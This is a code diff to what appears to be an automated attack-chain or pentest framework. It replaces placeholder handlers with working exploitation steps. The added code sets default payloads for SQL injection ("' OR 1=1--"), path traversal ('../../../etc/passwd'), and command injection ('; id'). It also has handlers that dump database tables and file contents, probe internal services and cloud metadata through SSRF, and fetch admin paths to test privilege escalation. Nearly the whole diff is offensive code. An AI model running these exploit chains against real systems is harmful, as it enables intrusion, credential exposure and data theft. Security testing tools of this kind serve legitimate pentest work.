@@ -821,36 +821,58 @@ class SqliValidateHandler implements StepHandler {
 }
 
 class SqliExploitHandler implements StepHandler {
-  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, signal: AbortSignal): Promise<StepResult> {
-    // Placeholder - implemented in post-exploitation module
-    return {
-      stepId: step.id,
-      stepName: step.name,
-      status: "success",
-      confidence: 0,
-      evidence: [],
-      startedAt: new Date(),
-      completedAt: new Date(),
-      durationMs: 0,
-      retryCount: 0,
-    };
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const { SqliPostExploitModule } = await import("./post-exploitation/sqli-post-exploit");
+      const module = new SqliPostExploitModule();
+      const result = await module.runFullExploitation({
+        targetUrl: context.target,
+        parameterName: step.config.parameter || "id",
+        parameterLocation: (step.config.parameterLocation || "url_param") as any,
+        httpMethod: (step.config.method || "GET") as any,
+        basePayload: step.config.basePayload || "' OR 1=1--",
+        dbType: (step.config.dbType || "unknown") as any,
+        headers: step.config.headers,
+      }, { skipData: true, maxTables: 5 });
+      return {
+        stepId: step.id, stepName: step.name,
+        status: result.success ? "success" : "failed",
+        confidence: result.fingerprint?.confidence || (result.success ? 75 : 0),
+        evidence: result.proofArtifacts.map((pa) => ({ type: pa.type, data: pa.data, hash: pa.hash, capturedAt: pa.capturedAt })),
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
   }
 }
 
 class SqliExfiltrateHandler implements StepHandler {
-  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, signal: AbortSignal): Promise<StepResult> {
-    // Placeholder - implemented in post-exploitation module
-    return {
-      stepId: step.id,
-      stepName: step.name,
-      status: "success",
-      confidence: 0,
-      evidence: [],
-      startedAt: new Date(),
-      completedAt: new Date(),
-      durationMs: 0,
-      retryCount: 0,
-    };
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const { SqliPostExploitModule } = await import("./post-exploitation/sqli-post-exploit");
+      const module = new SqliPostExploitModule();
+      const result = await module.runFullExploitation({
+        targetUrl: context.target,
+        parameterName: step.config.parameter || "id",
+        parameterLocation: (step.config.parameterLocation || "url_param") as any,
+        httpMethod: (step.config.method || "GET") as any,
+        basePayload: step.config.basePayload || "' OR 1=1--",
+        dbType: (step.config.dbType || "unknown") as any,
+        headers: step.config.headers,
+      }, { skipFingerprint: true, maxTables: step.config.maxTables || 3, maxRows: step.config.maxRows || 5, redact: true });
+      return {
+        stepId: step.id, stepName: step.name,
+        status: result.success ? "success" : "failed",
+        confidence: result.dataSamples && result.dataSamples.length > 0 ? 85 : (result.success ? 60 : 0),
+        evidence: result.proofArtifacts.map((pa) => ({ type: pa.type, data: pa.data, hash: pa.hash, capturedAt: pa.capturedAt })),
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
   }
 }
 
@@ -887,19 +909,30 @@ class PathTraversalValidateHandler implements StepHandler {
 }
 
 class PathTraversalExfiltrateHandler implements StepHandler {
-  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, signal: AbortSignal): Promise<StepResult> {
-    // Placeholder - implemented in post-exploitation module
-    return {
-      stepId: step.id,
-      stepName: step.name,
-      status: "success",
-      confidence: 0,
-      evidence: [],
-      startedAt: new Date(),
-      completedAt: new Date(),
-      durationMs: 0,
-      retryCount: 0,
-    };
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const { PathTraversalPostExploitModule } = await import("./post-exploitation/path-traversal-post-exploit");
+      const module = new PathTraversalPostExploitModule();
+      const result = await module.runFullExploitation({
+        targetUrl: context.target,
+        parameterName: step.config.parameter || "file",
+        parameterLocation: (step.config.parameterLocation || "url_param") as any,
+        httpMethod: (step.config.method || "GET") as any,
+        traversalPayload: step.config.traversalPayload || "../../../etc/passwd",
+        detectedOs: (step.config.detectedOs || "unix") as any,
+        headers: step.config.headers,
+      }, { maxFiles: 5, includeContent: true });
+      return {
+        stepId: step.id, stepName: step.name,
+        status: result.success ? "success" : "failed",
+        confidence: result.osFingerprint?.confidence || (result.fileProofs.filter((f) => f.readable).length > 0 ? 80 : 0),
+        evidence: result.proofArtifacts.map((pa) => ({ type: pa.type, data: pa.data, hash: pa.hash, capturedAt: pa.capturedAt })),
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
   }
 }
 
@@ -936,19 +969,30 @@ class CommandInjectionValidateHandler implements StepHandler {
 }
 
 class CommandInjectionExploitHandler implements StepHandler {
-  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, signal: AbortSignal): Promise<StepResult> {
-    // Placeholder - implemented in post-exploitation module
-    return {
-      stepId: step.id,
-      stepName: step.name,
-      status: "success",
-      confidence: 0,
-      evidence: [],
-      startedAt: new Date(),
-      completedAt: new Date(),
-      durationMs: 0,
-      retryCount: 0,
-    };
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const { CommandInjectionPostExploitModule } = await import("./post-exploitation/command-injection-post-exploit");
+      const module = new CommandInjectionPostExploitModule();
+      const result = await module.runFullExploitation({
+        targetUrl: context.target,
+        parameterName: step.config.parameter || "cmd",
+        parameterLocation: (step.config.parameterLocation || "url_param") as any,
+        httpMethod: (step.config.method || "GET") as any,
+        injectionPayload: step.config.injectionPayload || "; id",
+        detectedOs: (step.config.detectedOs || "unix") as any,
+        headers: step.config.headers,
+      }, { maxCommands: 5 });
+      return {
+        stepId: step.id, stepName: step.name,
+        status: result.rceProven ? "success" : (result.success ? "success" : "failed"),
+        confidence: result.systemFingerprint?.confidence || (result.rceProven ? 90 : result.success ? 70 : 0),
+        evidence: result.proofArtifacts.map((pa) => ({ type: pa.type, data: pa.data, hash: pa.hash, capturedAt: pa.capturedAt })),
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
   }
 }
 
@@ -985,19 +1029,44 @@ class AuthBypassValidateHandler implements StepHandler {
 }
 
 class AuthBypassEscalateHandler implements StepHandler {
-  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, signal: AbortSignal): Promise<StepResult> {
-    // Placeholder - implemented in post-exploitation module
-    return {
-      stepId: step.id,
-      stepName: step.name,
-      status: "success",
-      confidence: 0,
-      evidence: [],
-      startedAt: new Date(),
-      completedAt: new Date(),
-      durationMs: 0,
-      retryCount: 0,
-    };
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const adminPaths = step.config.adminPaths || ["/admin", "/api/admin", "/dashboard", "/api/users"];
+      const evidence: { type: string; data: any; capturedAt: Date }[] = [];
+      let escalated = false;
+
+      for (const path of adminPaths) {
+        try {
+          const url = new URL(path, context.target).toString();
+          const resp = await fetch(url, {
+            headers: step.config.headers || {},
+            signal: AbortSignal.timeout(10_000),
+          });
+          const body = await resp.text().catch(() => "");
+          if (resp.status >= 200 && resp.status < 400 && body.length > 100) {
+            escalated = true;
+            evidence.push({
+              type: "privilege_escalation",
+              data: { url, status: resp.status, bodyLength: body.length, snippet: body.slice(0, 200) },
+              capturedAt: new Date(),
+            });
+          }
+        } catch {
+          // Path not accessible — expected
+        }
+      }
+
+      return {
+        stepId: step.id, stepName: step.name,
+        status: escalated ? "success" : "failed",
+        confidence: escalated ? 75 : 0,
+        evidence,
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
   }
 }
 
@@ -1034,19 +1103,29 @@ class SsrfValidateHandler implements StepHandler {
 }
 
 class SsrfPivotHandler implements StepHandler {
-  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, signal: AbortSignal): Promise<StepResult> {
-    // Placeholder - implemented in lateral movement module
-    return {
-      stepId: step.id,
-      stepName: step.name,
-      status: "success",
-      confidence: 0,
-      evidence: [],
-      startedAt: new Date(),
-      completedAt: new Date(),
-      durationMs: 0,
-      retryCount: 0,
-    };
+  async execute(step: PlaybookStep, context: ChainExecutionContext, httpClient: ValidatingHttpClient, _signal: AbortSignal): Promise<StepResult> {
+    const startTime = Date.now();
+    try {
+      const { SsrfPostExploitModule } = await import("./post-exploitation/ssrf-post-exploit");
+      const module = new SsrfPostExploitModule();
+      const result = await module.runFullExploitation({
+        targetUrl: context.target,
+        parameterName: step.config.parameter || "url",
+        parameterLocation: (step.config.parameterLocation || "url_param") as any,
+        httpMethod: (step.config.method || "GET") as any,
+        headers: step.config.headers,
+      }, { maxProbes: 10 });
+      const accessible = result.internalServices.filter((s) => s.accessible).length;
+      return {
+        stepId: step.id, stepName: step.name,
+        status: result.success ? "success" : "failed",
+        confidence: result.cloudMetadata?.credentialsExposed ? 95 : (accessible > 0 ? 80 : result.localhostAccess ? 60 : 0),
+        evidence: result.proofArtifacts.map((pa) => ({ type: pa.type, data: pa.data, hash: pa.hash, capturedAt: pa.capturedAt })),
+        startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0,
+      };
+    } catch (error: any) {
+      return { stepId: step.id, stepName: step.name, status: "failed", confidence: 0, evidence: [], startedAt: new Date(startTime), completedAt: new Date(), durationMs: Date.now() - startTime, retryCount: 0, error: error.message };
+    }
   }
 }
 
